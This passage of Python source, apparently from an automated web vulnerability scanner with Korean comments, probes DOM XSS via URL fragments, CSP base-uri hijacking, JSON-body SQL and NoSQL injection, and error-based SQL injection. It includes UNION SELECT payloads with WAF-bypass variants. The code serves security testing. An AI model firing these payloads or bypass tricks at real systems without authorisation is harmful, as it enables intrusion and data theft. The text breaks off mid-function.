    루트뿐 아니라 '발견/인증 페이지'도 후보로 삼아 각 페이지의 DOM 싱크(location.hash 등만 읽는
    페이지 포함)를 테스트한다 — location.hash 만 읽는 비-루트 페이지가 통째로 누락되던 갭 보정.
    """
    try:
        import probe_policy
        if not probe_policy.dom_xss_enabled():
            return None
    except Exception:
        pass

    # 후보 페이지: 루트 + 발견 URL + 인증영역 페이지(경로 기준 중복제거·스코프·캡)
    _cands = [base_url]
    for u in (discovered_urls or []):
        _u = u if isinstance(u, str) else (u.get("url", "") if isinstance(u, dict) else "")
        if _u:
            _cands.append(_u)
    _cands += get_auth_urls(scan_id) if scan_id else []
    _seen: set = set()
    _cand_pages: list[str] = []
    for u in _cands:
        _p = u.split("#")[0].split("?")[0]
        if _p in _seen or not _url_in_scope(u, base_url):
            continue
        _seen.add(_p)
        _cand_pages.append(_p)

    _pl = _XSS_PAYLOADS[0]
    for page in _cand_pages[:24]:
        try:
            _, body, _ = await _get(session, page)
        except Exception:
            continue
        if not body:
            continue
        sinks = _DOM_XSS_SINKS.findall(body)
        sources = _DOM_XSS_SOURCES.findall(body)
        if not (sinks and sources):
            continue
        sink_list = list(dict.fromkeys(s[0] if isinstance(s, tuple) else s for s in sinks))[:5]
        src_list = list(dict.fromkeys(s[0] if isinstance(s, tuple) else s for s in sources))[:5]
        # ★프래그먼트 페이로드 후보(모두 '#' 뒤 → 서버로 전송 안 됨 = 순수 클라이언트측 DOM):
        #  (a) location.hash 전체를 읽는 싱크: #<payload>
        #  (b) href 에서 'param=' 를 찾는 싱크(DVWA default 등): #param=<payload>
        #      페이지 본문/링크에 실제로 등장하는 파라미터명만 골라 시도(범용·오탐 억제).
        _frag_list = [f"#{_pl}"]
        _seen_p = set()
        for _sp in ("default", "lang", "language", "q", "query", "search", "keyword", "name",
                    "redirect", "return", "url", "next", "page", "id", "content", "msg", "data"):
            if _sp in _seen_p:
                continue
            if re.search(rf'[?&#"\']{re.escape(_sp)}\b|[\'"]{re.escape(_sp)}=', body):
                _seen_p.add(_sp)
                _frag_list.append(f"#{_sp}={_pl}")
        _frag_list = _frag_list[:6]   # 페이지당 시도 상한
        for _frag in _frag_list:
            pw_result = await _playwright_verify_xss(page + _frag, scan_id=scan_id,
                                                     timeout_ms=5000, base_url=page)
            if not (pw_result and pw_result.get("confirmed")):
                continue
            alert_msg = pw_result.get("alert_message", "")
            return {
                "url": page,
                "payload": _frag,                     # 실제로 실행된 프래그먼트 페이로드(#…)
                "sinks": sink_list,
                "sources": src_list,
                "confirmed": True,
                "alert_message": alert_msg,
                "evidence_screenshots": pw_result.get("evidence_screenshots", []),
                "evidence": (f"DOM XSS 확인됨 — 프래그먼트 페이로드 '{_frag}' 로 alert('{alert_msg}') 실제 발생. "
                             f"'#' 뒤 값은 HTTP 요청으로 서버에 전송되지 않고 브라우저의 클라이언트 JS(DOM 싱크: "
                             f"{', '.join(sink_list) or 'document.write 등'})가 location 을 읽어 실행 → "
                             f"100% 클라이언트측 실행(반사형과 구분됨). 대상: {page}"),
            }
    return None


# ── CSP: 정책 우회(base-uri 하이재킹 등) ────────────────────────────────────────
# CSP 가 있어도 정책이 실효적으로 XSS 를 막지 못하는 경우(특히 base-uri 미설정 +
# nonce/strict-dynamic)를 탐지. alert 실행 게이트만으로는 이런 '우회 가능' 취약점을
# 위음성으로 놓치므로, CSP 헤더 자체를 정적 분석하고 <base> 하이재킹을 SAFE 하게 실증한다.
_CSP_INJ_MARKER = "eoscspINJ7f3a"  # raw 반사 판별용 유니크 마커
_CSP_NONCED_SCRIPT = re.compile(r'<script\b[^>]*\bnonce=', re.IGNORECASE)


async def _detect_raw_reflection_before_script(session, pt: dict) -> str | None:
    """GET 파라미터 중 값이 raw(무인코딩) HTML 로 반사되고, 그 반사 위치보다 뒤에
    nonce 스크립트 태그가 있는 파라미터명을 반환. 없으면 None.
    → 이 위치에 <base> 를 주입하면 뒤따르는 nonce 스크립트 로드를 하이재킹할 수 있다."""
    if pt.get("method", "GET").upper() != "GET":
        return None
    for param in list(pt.get("params") or {})[:8]:
        probe_val = f"<{_CSP_INJ_MARKER}>"
        url = _build_xss_url(pt, param, probe_val)
        _, body, hdrs = await _get(session, url)
        if not body or "text/html" not in hdrs.get("Content-Type", ""):
            continue
        raw_tag = f"<{_CSP_INJ_MARKER}>"
        pos = body.find(raw_tag)
        if pos < 0:
            continue  # 인코딩됐거나 미반사 → raw 주입 불가
        # 반사 위치 뒤에 nonce 스크립트가 존재해야 <base> 하이재킹 대상이 됨
        if _CSP_NONCED_SCRIPT.search(body, pos):
            return param
    return None


async def _verify_base_uri_hijack(pt: dict, param: str, scan_id: str = "") -> dict | None:
    """<base> 주입으로 nonce 스크립트 로드 출처를 로컬 리스너로 돌려, 하이재킹된
    스크립트가 CSP(nonce/strict-dynamic) 하에서 실제 실행되는지 헤드리스 브라우저로 실증.
    SAFE: 로컬 127.0.0.1 리스너만 사용, 데이터 유출/상태변경 없음, GET 만."""
    try:
        from aiohttp import web
        from playwright.async_api import async_playwright
    except Exception:
        return None

    marker = "EOS_CSP_BASEURI_HIJACK_PROVEN"
    state = {"js_requested": False, "executed": False, "paths": []}
    # 로컬(loopback) 리스너로의 요청은 Private/Local Network Access 대상 → 허용 헤더 부여.
    # (실제 공격에서는 공격자 서버가 공개망이라 무관. 로컬 실증용 네트워크 계층 처리일 뿐.)
    _pna = {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Private-Network": "true",
        "Access-Control-Allow-Methods": "GET,OPTIONS",
        "Access-Control-Allow-Headers": "*",
    }

    async def handle(request):
        state["js_requested"] = True
        state["paths"].append(request.path)
        if request.method == "OPTIONS":
            return web.Response(status=200, headers=_pna)
        # 하이재킹된 스크립트에는 무해한 실행 증명 JS 만 반환(유출/부작용 없음)
        if request.path.endswith(".js"):
            return web.Response(
                text=f"document.title={marker!r};",
                content_type="application/javascript", headers=_pna,
            )
        return web.Response(text="", content_type="text/plain", headers=_pna)

    app = web.Application()
    app.router.add_route("*", "/{tail:.*}", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", 0)
    await site.start()
    try:
        port = None
        for s in site._server.sockets:  # type: ignore[attr-defined]
            port = s.getsockname()[1]
            break
        if not port:
            return None

        payload = f'<base href="http://127.0.0.1:{port}/">'
        target_url = _build_xss_url(pt, param, payload)

        # CSP 는 온전히 강제(--disable-web-security 미사용). loopback 리스너로의 로컬
        # 네트워크 접근 검사만 비활성(공개 공격서버였다면 발생하지 않을 아티팩트).
        _launch_args = [
            "--no-sandbox", "--disable-setuid-sandbox", "--disable-gpu",
            "--disable-features=LocalNetworkAccessChecks,"
            "PrivateNetworkAccessForSubresources,BlockInsecurePrivateNetworkRequests",
        ]
        async with async_playwright() as pw:
            browser = None
            for _launch_kw in ({}, {"channel": "chrome"},
                               {"executable_path": "/usr/bin/google-chrome"}):
                try:
                    browser = await pw.chromium.launch(
                        headless=True, args=_launch_args, **_launch_kw)
                    break
                except Exception:
                    continue
            if browser is None:
                return None
            ctx = await browser.new_context(user_agent=_SCANNER_UA)
            page = await ctx.new_page()
            try:
                await page.goto(target_url, wait_until="domcontentloaded", timeout=8000)
                await page.wait_for_timeout(1500)
                try:
                    title = await page.title()
                except Exception:
                    title = ""
                state["executed"] = (title == marker)
            except Exception:
                pass
            finally:
                await browser.close()

        return {
            "hijack_requested": state["js_requested"],
            "hijack_executed": state["executed"],
            "hijacked_paths": state["paths"][:5],
            "base_payload": payload,
            "target_url": target_url,
        }
    finally:
        try:
            await runner.cleanup()
        except Exception:
            pass


async def _probe_csp_weaknesses(session, base_url: str, points: list[dict],
                                scan_id: str = "") -> dict | None:
    """CSP 정책 우회 점검. base-uri 미설정+nonce/strict-dynamic 이면서 raw 반사 주입점이
    있으면 <base> 하이재킹을 브라우저로 실증(CONFIRMED). 실행 미확인이어도 정적 우회+주입점이
    있으면 POSSIBLE 로 보고(위음성 방지)."""
    try:
        import probe_policy
        if not probe_policy.csp_bypass_enabled():
            return None
    except Exception:
        pass
    try:
        import csp_analyzer
    except Exception:
        return None

    # 후보 페이지: base_url + GET 포인트 URL(중복 제거, 최대 8)
    candidates: list[dict] = []
    seen = set()
    base_pt = {"url": base_url, "method": "GET", "params": {}}
    for pt in [base_pt, *points]:
        if pt.get("method", "GET").upper() != "GET":
            continue
        key = pt["url"].split("#")[0]
        if key in seen:
            continue
        seen.add(key)
        candidates.append(pt)
        if len(candidates) >= 8:
            break

    best: dict | None = None
    for pt in candidates:
        _, body, hdrs = await _get(session, pt["url"])
        csp = hdrs.get("Content-Security-Policy") or hdrs.get("content-security-policy") or ""
        if not csp:
            continue

        # 같은 페이지의 주입점: raw 반사(파라미터) 또는 URL→innerHTML DOM 싱크
        refl_param = await _detect_raw_reflection_before_script(session, pt)
        dom_sink = bool(_URL_DOM_SOURCE.search(body) and _DOM_WRITE_SINK.search(body))
        has_injection = bool(refl_param) or dom_sink

        weaknesses = csp_analyzer.analyze_csp(csp, has_injection_point=has_injection)
        if not weaknesses:
            continue

        hijackable = any(w["id"] == "base_uri_script_hijack" for w in weaknesses)

        hijack = None
        # base-uri 하이재킹 전제 + raw 반사 주입점 → 브라우저 실증 시도
        if hijackable and refl_param:
            hijack = await _verify_base_uri_hijack(pt, refl_param, scan_id=scan_id)

        verdict = probe_policy.judge_csp_bypass(
            hijack_executed=bool(hijack and hijack.get("hijack_executed")),
            hijack_requested=bool(hijack and hijack.get("hijack_requested")),
            bypassable_static=csp_analyzer.is_xss_bypassable(csp, has_injection_point=has_injection),
            injection_point=has_injection,
        )
        if verdict is None:
            continue

        confirmed = verdict == "CONFIRMED"
        candidate_finding = {
            "url": pt["url"],
            "csp": csp,
            "weaknesses": weaknesses,
            "verdict": verdict,
            "confirmed": confirmed,
            "reflection_param": refl_param,
            "dom_sink": dom_sink,
            "injection_point": has_injection,
        }
        if hijack:
            candidate_finding.update({
                "hijack_executed": hijack.get("hijack_executed"),
                "hijack_requested": hijack.get("hijack_requested"),
                "base_payload": hijack.get("base_payload"),
                "target_url": hijack.get("target_url"),
                "hijacked_paths": hijack.get("hijacked_paths"),
            })
            top = weaknesses[0]
            candidate_finding["evidence"] = (
                f"CSP {top['id']} — <base href> 주입으로 nonce 스크립트가 공격자 출처에서 "
                f"로드되어 브라우저에서 실제 실행됨(CSP nonce/strict-dynamic 통과). "
                f"주입 파라미터='{refl_param}'."
                if confirmed else
                f"CSP {top['id']} — <base> 하이재킹된 스크립트 로드 요청 관측(실행 확인 전)."
            )
        else:
            candidate_finding["evidence"] = (
                f"CSP {weaknesses[0]['id']} — 정적 분석상 XSS 우회 가능 + 주입점 존재(POSSIBLE)."
            )

        # CONFIRMED 를 우선 채택, 아니면 첫 후보 유지
        if confirmed:
            return candidate_finding
        if best is None:
            best = candidate_finding

    return best


# ── API JSON 바디 주입 (모던 API 대응 — form/쿼리 아닌 JSON 바디) ──────────────────
# SPA/모던 API 는 application/json 바디를 받는다. 기존 주입 프로브는 form/쿼리라 JSON API 는
# 표면을 못 찔렀다. 여기서 JSON 바디에 SQLi(에러기반 차등)·NoSQL(연산자 주입)을 비파괴 실증한다.
_JSON_API_FIELDS = ["email", "username", "user", "userid", "id", "login", "q", "query",
                    "search", "name", "title", "keyword", "coupon", "token", "orderId"]
_JSON_API_PATH_RE = re.compile(r'/(api|rest|graphql|gql|v\d+|json|service)/', re.IGNORECASE)


def _is_json_api_point(pt: dict) -> bool:
    if pt.get("source") == "js_endpoint":
        return True
    u = pt.get("url", "") or ""
    return bool(_JSON_API_PATH_RE.search(u))


async def _probe_json_injection(session, base_url: str, points: list[dict],
                                scan_id: str = "") -> dict | None:
    """JSON 바디 주입: 모던 API 엔드포인트에 JSON 으로 SQLi(에러기반 차등)/NoSQL(연산자) 주입.
    비파괴(오작동 유발 입력만, 상태변경 없음). form/쿼리 프로브가 못 찌르던 JSON API 표면 커버."""
    import deep_detect as _dd
    import client_analysis as _ca
    cand = [p for p in (points or []) if _is_json_api_point(p)]
    if not cand:
        return None
    # 주입 유망 엔드포인트를 앞으로: 파라미터 보유 > 인증/검색/사용자류 경로 > 그 외.
    # (JS 마이닝된 다수의 GET 표면이 로그인/검색 같은 실제 주입점을 밀어내지 않도록)
    _HINT_RE = re.compile(r'/(login|signin|auth|token|search|query|user|users|account|'
                          r'member|order|coupon|feedback|product|review)s?\b', re.IGNORECASE)
    def _prio(p):
        u = p.get("url", "") or ""
        return (0 if (p.get("params")) else 1, 0 if _HINT_RE.search(u) else 1)
    targets = sorted(cand, key=_prio)[:20]
    for pt in targets:
        url = pt.get("url", "")
        if not url or not _url_in_scope(url, base_url):
            continue
        # 후보 필드 = 엔드포인트 자체 파라미터 + 공통 API 필드
        fields = list(dict.fromkeys(list((pt.get("params") or {}).keys()) + _JSON_API_FIELDS))[:6]
        benign = {f: "test" for f in fields}
        for f in fields:
            # ── (A) 에러기반 SQLi 차등: 원본 / 홑따옴표(구문파괴) / 균형따옴표(복귀) ──
            try:
                sb, bb, _ = await _post(session, url, json={**benign, f: "test"})
                so, bo, _ = await _post(session, url, json={**benign, f: "test'"})
                se, be, _ = await _post(session, url, json={**benign, f: "test''"})
            except ScanInterrupted:
                raise
            except Exception:
                continue
            if bo and _SQL_ERR.search(bo):
                return {
                    "type": "json_sqli_error", "confirmed": True, "url": url, "param": f,
                    "method": "POST", "cwe_hint": "CWE-89",
                    "evidence": (f"JSON 바디 SQL 인젝션: 엔드포인트 '{url}' 의 JSON 필드 '{f}' 에 홑따옴표 "
                                 f"주입 시 DB 에러 노출 — {_SQL_ERR.search(bo).group(0)[:80]}"),
                    "affected_endpoints": [url],
                }
            if (sb and so and se and sb < 500 <= so and se < 500
                    and not _WAF_BLOCK_RE.search(bo or "")):
                return {
                    "type": "json_sqli_diff", "confirmed": True, "url": url, "param": f,
                    "method": "POST", "cwe_hint": "CWE-89",
                    "evidence": (f"JSON 바디 SQL 인젝션(차등 오류): '{f}' 홑따옴표→HTTP {so}(구문파괴), "
                                 f"균형따옴표→HTTP {se}(정상복귀) — 입력이 SQL 쿼리에 삽입됨."),
                    "affected_endpoints": [url],
                }
            # ── (B) NoSQL 연산자 주입: 값에 {$ne:null} vs 정상 vs 대조 ──
            try:
                sn, bn, _ = await _post(session, url, json={**benign, f: "test"})
                si, bi, _ = await _post(session, url, json={**benign, f: {"$ne": None}})
                sc, bc, _ = await _post(session, url, json={**benign, f: {"$eq": "eoseureum_nomatch_zzz"}})
            except ScanInterrupted:
                raise
            except Exception:
                continue
            if bn and bi and _dd.judge_nosql_operator(len(bn), len(bi), len(bc)):
                return {
                    "type": "json_nosqli", "confirmed": True, "url": url, "param": f,
                    "method": "POST", "cwe_hint": "CWE-943",
                    "evidence": (f"JSON 바디 NoSQL 인젝션: '{f}' 에 연산자 {{$ne:null}} 주입 시 응답이 "
                                 f"정상/대조 대비 유의미하게 달라짐 — NoSQL 연산자가 서버에서 해석됨."),
                    "affected_endpoints": [url],
                }
    return None


# ── GI: SQL 인젝션 ─────────────────────────────────────────────────────────────

_SQL_ERR = re.compile(
    r"(SQL syntax.*?MySQL|Warning.*?mysql_|MySQLSyntaxError|"
    r"valid MySQL result|check the manual.*?MySQL server version|"
    r"PostgreSQL.*?ERROR|Warning.*?pg_exec|SQLSTATE\[|pg_query\(\)|"
    r"ORA-\d{4,}|Oracle.*?Driver|Oracle.*?Error|"
    r"SQL Server.*?Driver|ODBC.*?SQL|Microsoft.*?ODBC|"
    r"SQLiteException|sqlite3\.OperationalError|SQLite/JDBCDriver|"
    r"SQLITE_ERROR|unrecognized token|"
    r"Unclosed quotation mark|Incorrect syntax near|"
    r"Column count doesn't match|You have an error in your SQL|"
    r"supplied argument is not a valid MySQL|Division by zero|"
    # .NET/MSSQL 추가 시그니처(testaspnet 등 ASP.NET 사이트에서 흔히 누출)
    r"System\.Data\.SqlClient|System\.Data\.OleDb|SqlException|"
    r"Conversion failed when converting|String or binary data would be truncated|"
    r"OLE DB.*?error|\[SQL Server\]|\[Microsoft\]\[ODBC|"
    r"quoted string not properly terminated|"
    r"Syntax error.*SQL|near \".*\": syntax error)",
    re.IGNORECASE,
)


def _classify_error_leak(snippet: str) -> dict:
    """DB/서버 오류 스니펫에서 '무엇이 노출되는지'와 '왜 위험한지'를 분류한다.

    에러페이지 정보노출 finding 이 "그래서 어떤 정보가 새고, 공격자가 그걸로 뭘 할 수 있는지"를
    구체적으로 서술하도록 돕는다(범용 — DBMS/경로/스택 시그니처 기반, 특정 대상 가정 없음)."""
    s = snippet or ""
    sl = s.lower()
    dbms = ""
    if re.search(r'mariadb', sl):
        dbms = "MariaDB"
    elif re.search(r'mysql|you have an error in your sql', sl):
        # "You have an error in your SQL[ syntax]" 은 MySQL/MariaDB 계열 시그니처.
        dbms = "MySQL/MariaDB"
    elif re.search(r'postgresql|pg_query|pg_exec|sqlstate', sl):
        dbms = "PostgreSQL"
    elif re.search(r'ora-\d{4,}|oracle', sl):
        dbms = "Oracle"
    elif re.search(r'sql server|microsoft.*odbc|ole db|sqlclient|sqlexception', sl):
        dbms = "Microsoft SQL Server"
    elif re.search(r'sqlite', sl):
        dbms = "SQLite"
    kinds = []
    if dbms:
        kinds.append(f"DBMS 종류={dbms}")
    if re.search(r"near '|syntax to use near|check the manual|you have an error in your sql|"
                 r"\bSELECT\b|\bFROM\b|\bWHERE\b", s, re.IGNORECASE):
        kinds.append("실행된 SQL 구문 일부")
    if re.search(r'(/[\w.\-/]+\.(?:php|asp|aspx|jsp)|/var/www|/home/|[A-Za-z]:\\\\|on line \d+)', s):
        kinds.append("서버 내부 파일 경로/라인번호")
    if re.search(r'stack trace|traceback|at [\w.$]+\(|System\.', s, re.IGNORECASE):
        kinds.append("스택 트레이스")
    if not kinds:
        kinds.append("DB 엔진 내부 오류 메시지")
    label = ", ".join(kinds)
    util = []
    if dbms:
        util.append(f"공격자는 대상 DBMS 를 '{dbms}' 로 특정해, 해당 엔진 전용 인젝션 문법·함수"
                    f"(버전/사용자 추출·파일 읽기 등)와 알려진 취약점을 골라 후속 SQL 인젝션 성공률을 크게 높일 수 있음")
    if "실행된 SQL 구문 일부" in label:
        util.append("노출된 SQL 구문으로 쿼리 구조(컬럼 수·테이블·조건)를 추론해 UNION/블라인드 주입 페이로드를 정밀 설계할 수 있음")
    if "서버 내부 파일 경로/라인번호" in label:
        util.append("노출된 내부 경로로 웹 루트·설치 구조를 파악해 파일 접근·업로드 경로 추정 등 경로 기반 공격에 활용할 수 있음")
    if "스택 트레이스" in label:
        util.append("스택 트레이스로 프레임워크·라이브러리 버전과 코드 흐름을 파악해 대상별 알려진 취약점을 특정할 수 있음")
    if not util:
        util.append("내부 구현 정보가 새어 후속 공격의 정확도를 높임")
    return {"dbms": dbms, "kinds": kinds, "label": label, "utility": " ; ".join(util)}

# UNION SELECT로 DB 버전 추출 시도 (컬럼 수 1~5 + WAF 우회)
_SQLI_UNION_PAYLOADS = [
    # 기본 페이로드
    "' UNION SELECT @@version-- -",
    "' UNION SELECT @@version,NULL-- -",
    "' UNION SELECT @@version,NULL,NULL-- -",
    "' UNION SELECT NULL,@@version,NULL-- -",
    "' UNION SELECT NULL,NULL,@@version-- -",
    "1 UNION SELECT version()-- -",
    "1 UNION SELECT version(),NULL-- -",
    # 탭 문자로 공백 우회 (webhacking.kr: %09 기법)
    "'\tUNION\tSELECT\t@@version-- -",
    "'\tUNION\tSELECT\t@@version,NULL-- -",
    "1\tUNION\tSELECT\tversion()-- -",
    # MySQL 인라인 주석 우회 (/*!...*/)
    "' /*!UNION*/ /*!SELECT*/ @@version-- -",
    "' UNION/*!50000SELECT*/@@version-- -",
    # OR 대신 || 연산자 우회
    "' ||'1'='1' UNION SELECT @@version-- -",
    # 해시 주석 우회
    "' UNION SELECT @@version#",
    "' UNION SELECT @@version,NULL#",
]

# 실제 DB 버전 패턴 — 반드시 x.y.z 이상 세 자리거나 DB 식별자 포함
# "HTML 2.0", "HTTP/1.1" 같은 프로토콜 버전과 구분하기 위해 엄격하게 작성
_SQLI_VERSION_RE = re.compile(
    r"(?<![/\w])("
    r"\d+\.\d+\.\d+[-.\w]*(?:MariaDB|MySQL|Debian|Ubuntu|log)?"  # x.y.z...
    r"|(?:MariaDB|MySQL|PostgreSQL|MSSQL|SQLite)\s*[\w\s]*\d+\.\d+"  # DB명 포함
    r")(?![.\d])",
    re.IGNORECASE,
)

# WAF / 보안 장비 차단 응답 패턴
_WAF_BLOCK_RE = re.compile(
    r"(mod.?security|modsec|security violation|blocked by|"
    r"request rejected|access denied|web application firewall|"
    r"errdoc\.|forbidden by policy)",
    re.IGNORECASE,
)


# ── SQLi 지점 우선순위: 전형적 SQLi 표면(id·숫자값·news/product 등)을 앞으로 배치.
# 캡(points[:N])에 잘려 취약 파라미터를 놓치던 미검출(FN)을 방지한다.
_SQLI_LIKELY_PARAM = re.compile(
    r'(^|[_\-])(id|uid|no|seq|idx|num|pk|cat|category|artist|news|newsid|article|board|bbs|'
    r'product|prod|item|pid|page|pageno|q|query|search|keyword|kw|sort|order|orderby|name|'
    r'user|username|login|email|view|read|group|gid|type|code|ref|year|month|day)($|[_\-])',
    re.IGNORECASE)
_SQLI_LIKELY_PATH = re.compile(
    r'/(news|article|product|item|board|bbs|list|view|read|search|detail|category|shop|'
    r'member|user|profile|order|comment|post|goods|content)', re.IGNORECASE)


def _sqli_point_score(pt: dict) -> int:
    score = 0
    params = pt.get("params") or {}
    # 매칭 파라미터 보너스는 '지점당 상한'을 둔다(파라미터 마이닝 합성지점이 매칭 파라미터를
    # 여러 개 몰아 담아 점수가 부풀어, 전용 취약 엔드포인트(/sqli/?id=)를 밀어내고 '대표'로
    # 확증돼 이상한 재현·오탐을 유발하던 문제 교정). 최대 +5 로 제한.
    _likely = sum(1 for k in params if _SQLI_LIKELY_PARAM.search(str(k)))
    score += min(_likely, 1) * 3 + (1 if _likely >= 2 else 0) * 2   # 1개=3, 2개이상=+2 상한(≤5)
    for v in params.values():
        if str(v).strip().lstrip("-").isdigit():      # 숫자 값 = 전형적 주입 표면
            score += 2
            break   # 숫자값 보너스도 1회만
    _path = ""
    try:
        _path = urllib.parse.urlparse(pt.get("url", "")).path or ""
        if _SQLI_LIKELY_PATH.search(_path):
            score += 1
    except Exception:
        pass
    if params:
        score += 1
    # ★전용 취약 엔드포인트 우대: 경로가 있는 실제 페이지(/vulnerabilities/sqli/ 등)를 앞으로,
    #  경로 없는 루트('/'·'')·마이닝 합성지점은 강등(마이닝 루트 지점이 대표가 되던 문제 교정).
    if _path and _path not in ("/", ""):
        score += 2
    else:
        score -= 3   # 루트/경로없음 강등
    # ★블라인드 전용 표면 우대: 데이터가 화면에 안 보여 error/union 이 못 잡는 '블라인드'류 엔드포인트
    #  (경로에 blind 포함)를 앞으로 올려, 문자단위 추출 실증 sweep 이 반드시 닿게 한다.
    if re.search(r'blind', _path, re.IGNORECASE):
        score += 4
    if str(pt.get("source", "")) in ("mined", "generic"):
        score -= 2   # 마이닝/합성 지점 강등
    # 로그인/인증 폼 강등(로그인폼 SQLi 는 login_sqli 프로브가 별도 담당).
    if _is_auth_form_point(pt):
        score -= 5
    return score


def _prioritize_sqli_points(points: list[dict]) -> list[dict]:
    """SQLi 가능성 높은 지점을 앞으로(안정 정렬). 캡에 잘려도 핵심 표면은 점검되도록."""
    return sorted(points or [], key=_sqli_point_score, reverse=True)


def _sqli_cap(base: int) -> int:
    """SQLi 점검 지점 상한(env SQLI_COVERAGE_MULT 로 스케일, 기본 2배). 스캔 시간 예산 확대에 대응."""
    try:
        mult = float(os.getenv("SQLI_COVERAGE_MULT", "2"))
    except Exception:
        mult = 2.0
    try:
        import validation_profiles as _vp
        if _vp.proof_active():
            mult = max(mult, 4.0)   # PROOF: 인증 영역까지 넓게 커버(점검 지점 상한 상향)
    except Exception:
        pass
    return max(base, int(base * max(1.0, mult)))


def _pts_cap(points: list) -> list:
    """주입점 순회 상한(3-F) — scan_depth.injection_points_cap() 로 균일 제한.

    points 는 상류(gather 준비단계)에서 이미 MAX_INJECTION_POINTS(=injection_points_cap, 기본 40×scale)로
    캡되므로 정상 경로에선 커버리지 손실이 없다(같은 상한 재적용 = no-op). 단, 이 프로브들이 더 큰
    리스트로 호출될 경우의 폭주를 막는 방어선이자 SSTI([:10]) 등 다른 프로브와의 정렬(무제한 for 제거)."""
    try:
        import scan_depth as _sd
        cap = _sd.injection_points_cap()
    except Exception:
        cap = 40
    return points[:max(1, cap)]


async def _probe_sqli_error(session, points: list[dict], scan_id: str = "") -> dict | None:
    """에러 기반 SQL 인젝션: DB 에러 메시지 노출 + '무-에러메시지' 차등 오류 신호."""
    for pt in points[:_sqli_cap(12)]:
        for param in list(pt["params"])[:8]:
            orig = pt["params"][param]

            # ── 차등 오류 신호 ────────────────────────────────────────────────
            # DB 에러 메시지가 응답에 노출되지 않고 일반 500 페이지만 떠도, 입력이 SQL
            # 구문에 삽입되면 "홑따옴표(')→구문 파괴(5xx), 균형따옴표('')→정상 복귀" 차등이
            # 나타난다(예: WAF 뒤 error-based, Flask 프로덕션 500). 균형따옴표 복귀가 오탐 배제.
            try:
                _q_base = {**pt["params"], param: str(orig)}
                _q_odd  = {**pt["params"], param: str(orig) + "'"}
                _q_even = {**pt["params"], param: str(orig) + "''"}
                if pt["method"] == "POST":
                    _sb, _bb, _ = await _post(session, pt["url"], data=_q_base)
                    _odd_url = pt["url"]
                    _so, _bo, _ = await _post(session, pt["url"], data=_q_odd)
                    _se, _be, _ = await _post(session, pt["url"], data=_q_even)
                else:
                    _sb, _bb, _ = await _get(session, pt["url"] + "?" + urllib.parse.urlencode(_q_base))
                    _odd_url = pt["url"] + "?" + urllib.parse.urlencode(_q_odd)
                    _so, _bo, _ = await _get(session, _odd_url)
                    _se, _be, _ = await _get(session, pt["url"] + "?" + urllib.parse.urlencode(_q_even))
                if (_sb and _sb < 500 and _so and _so >= 500 and _se and _se < 500
                        and not _WAF_BLOCK_RE.search(_bo or "")):
                    _shots = []
                    if scan_id:
                        _shots = await _capture_step_shots(scan_id, [
                            (pt["url"],
                             f"【1단계】 점검 대상 접속 · 파라미터 '{param}' 식별",
                             "#1E3A5F", "left"),
                            (_odd_url,
                             f"【2단계】 홑따옴표(') 주입 → HTTP {_so}\nSQL 구문 파괴로 서버 오류 유발",
                             "#B45309", "left"),
                            (_odd_url,
                             f"【3단계】 ★ SQL 인젝션(차등 오류) 확인\n"
                             f"균형따옴표('')로 HTTP {_se} 정상 복귀 → 입력이 쿼리에 삽입됨",
                             "#DC2626", "center"),
                        ], f"sqli_diff_{param[:8]}")
                    return {
                        "type": "error_based",
                        "param": param,
                        "payload": "'",
                        "url": pt["url"],
                        "method": pt["method"],
                        # 정확 재현용: GET 은 홑따옴표 주입된 완전 URL, POST 는 base + 주입 body
                        "repro_url": _odd_url,
                        "repro_body": (urllib.parse.urlencode(_q_odd)
                                       if pt["method"] == "POST" else ""),
                        "error_snippet": f"HTTP {_sb}→{_so}→{_se} (원본/홑따옴표/균형따옴표)",
                        "confirmed": True,
                        "evidence_screenshots": _shots,
                        "evidence": (f"차등 오류 신호 — 원본값:HTTP {_sb}, +홑따옴표('):HTTP {_so}"
                                     f"(SQL 구문 파괴), +균형따옴표(''):HTTP {_se}(정상 복귀). "
                                     f"DB 에러 메시지 없이도 입력이 SQL 쿼리에 삽입됨을 실증."),
                    }
            except Exception:
                pass

            # 베이스라인: 원래 값으로 요청했을 때 이미 DB 에러가 뜨는 페이지(깨진 페이지·문서 등)면
            # 페이로드와 무관하므로 확정 대상에서 제외(오탐 방지).
            try:
                _bq = {**pt["params"], param: str(orig)}
                if pt["method"] == "POST":
                    _, _base_body, _ = await _post(session, pt["url"], data=_bq)
                else:
                    _, _base_body, _ = await _get(session, pt["url"] + "?" + urllib.parse.urlencode(_bq))
                _base_sqlerr = bool(_base_body and _SQL_ERR.search(_base_body))
            except Exception:
                _base_sqlerr = False

            for payload in ("'", "''", "1'", '"', "1' AND '1'='1", "1 AND 1=2--"):
                tp = {**pt["params"], param: str(orig) + payload}
                if pt["method"] == "POST":
                    status, body, _ = await _post(session, pt["url"], data=tp)
                    shot_url = pt["url"]
                else:
                    shot_url = pt["url"] + "?" + urllib.parse.urlencode(tp)
                    status, body, _ = await _get(session, shot_url)
                if status != 200 or not body:
                    continue
                if _WAF_BLOCK_RE.search(body):
                    continue
                if _SQL_ERR.search(body) and not _base_sqlerr:
                    # 매칭 시그니처만이 아니라 '주변 문맥'까지 담는다 — DBMS 종류/버전·near 구문 등이
                    # 시그니처 바로 뒤에 오므로(예: "...for the right syntax to use near ''' ..."),
                    # 이걸 놓치면 에러정보노출 finding 이 DBMS 를 특정 못하고 일반 서술로 떨어진다.
                    _m = _SQL_ERR.search(body)
                    snippet = body[max(0, _m.start() - 10): _m.end() + 220].strip()[:280]
                    base_url = pt["url"]
                    shots = await _capture_step_shots(scan_id, [
                        (base_url,
                         f"【1단계】 점검 대상 URL 접속\nURL: {base_url[:100]}\n"
                         f"취약 파라미터 '{param}' 식별",
                         "#1E3A5F", "left"),
                        (shot_url,
                         f"【2단계】 SQL 인젝션 페이로드 삽입 ({pt['method']})\n"
                         f"파라미터: {param}\n페이로드: {payload}",
                         "#B45309", "left"),
                        (shot_url,
                         f"【3단계】 ★ SQL 인젝션 확인 + DB 에러 정보노출\n"
                         f"주입한 따옴표로 DB 엔진이 SQL 구문오류를 응답에 그대로 노출\n"
                         f"= 주입이 쿼리에 반영됨을 증명(SQLi) + DBMS 종류·구조가 새는 정보노출(CWE-209)\n{snippet[:120]}",
                         "#DC2626", "center"),
                    ], f"sqli_err_{param[:8]}")
                    # Burp Suite 스타일 요청/응답 증거 스크린샷
